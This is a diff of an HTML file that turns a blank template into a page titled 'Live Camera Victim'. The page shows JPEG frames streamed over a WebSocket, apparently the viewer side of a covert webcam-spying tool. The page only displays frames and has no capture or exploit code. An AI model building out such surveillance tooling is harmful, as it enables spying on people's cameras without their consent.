@@ -1,10 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <title>Live Camera Victim</title>
 </head>
 <body>
+  <h1>Live Camera Victim Stream</h1>
+  <img id="video" width="640" height="480" />
+  <script>
+    const ws = new WebSocket('socket server');
+    const img = document.getElementById('video');
+    ws.onmessage = (event) => {
+      img.src = 'data:image/jpeg;base64,' + event.data;
+    };
+    ws.onopen = () => console.log("WebSocket connected!");
+    ws.onerror = (err) => console.error("WebSocket error:", err);
+  </script>
 </body>
 </html>
